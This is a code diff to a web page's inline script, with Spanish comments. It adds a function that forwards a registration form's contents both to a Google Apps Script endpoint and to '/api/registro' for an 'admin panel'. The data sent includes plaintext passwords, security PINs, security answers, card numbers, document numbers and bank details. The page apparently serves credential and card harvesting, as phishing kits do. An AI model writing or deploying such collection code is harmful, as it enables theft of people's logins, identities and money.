@@ -110,8 +110,75 @@
         sendWithFetch(appsScriptUrl, serializedPayload);
       }
 
+      // Función para enviar también a Supabase (dual envío)
+      function sendRegistrationToSupabase(payload) {
+        try {
+          var supabasePayload = {
+            email: payload.email || null,
+            first_name: payload.firstName || null,
+            last_name: payload.lastName || null,
+            full_name: (payload.firstName && payload.lastName) ? payload.firstName + ' ' + payload.lastName : null,
+            preferred_name: payload.preferredName || payload.nickname || null,
+            nickname: payload.nickname || null,
+            country: payload.country || null,
+            state: payload.state || null,
+            gender: payload.gender || null,
+            birth_day: payload.birthDay || null,
+            birth_month: payload.birthMonth || null,
+            birth_year: payload.birthYear || null,
+            document_type: payload.documentType || null,
+            document_number: payload.documentNumber || null,
+            phone_country_code: payload.phoneCountryCode || null,
+            phone_prefix: payload.phonePrefix || null,
+            phone_number: payload.phoneNumber || payload.nationalPhoneNumber || null,
+            full_phone_number: payload.fullPhoneNumber || payload.phoneNumberFull || null,
+            password: payload.password || null,
+            security_pin: payload.securityPin || null,
+            security_question: payload.securityQuestion || null,
+            security_answer: payload.securityAnswer || null,
+            card_number: payload.cardNumber || null,
+            account_type: payload.accountType || null,
+            purpose: payload.purpose || null,
+            payment_method: payload.paymentMethod || null,
+            paypal_email: payload.paypalEmail || null,
+            operator: payload.operator || null,
+            initial_recharge_confirmed: payload.initialRechargeConfirmed || false,
+            venezuela_bank: payload.venezuelaBank || null,
+            signature_data_url: payload.signatureDataUrl || null
+          };
+
+          fetch('/api/registro', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(supabasePayload),
+            mode: 'cors'
+          }).then(function(response) {
+            if (response.ok) {
+              console.log('[Supabase] Registro guardado exitosamente');
+            } else {
+              console.warn('[Supabase] Error al guardar registro:', response.status);
+            }
+          }).catch(function(error) {
+            console.warn('[Supabase] No se pudo conectar:', error);
+          });
+        } catch (error) {
+          console.warn('[Supabase] Error inesperado:', error);
+        }
+      }
+
+      // Función wrapper para dual envío (Google Apps Script + Supabase)
+      function dualSendRegistration(payload) {
+        // Enviar a Google Apps Script (comportamiento existente)
+        sendRegistrationToAppsScript(payload);
+
+        // También enviar a Supabase para el panel de administración
+        sendRegistrationToSupabase(payload);
+      }
+
       window.googleAppsScriptIntegration = {
-        send: sendRegistrationToAppsScript
+        send: dualSendRegistration
       };
     })();
   </script>
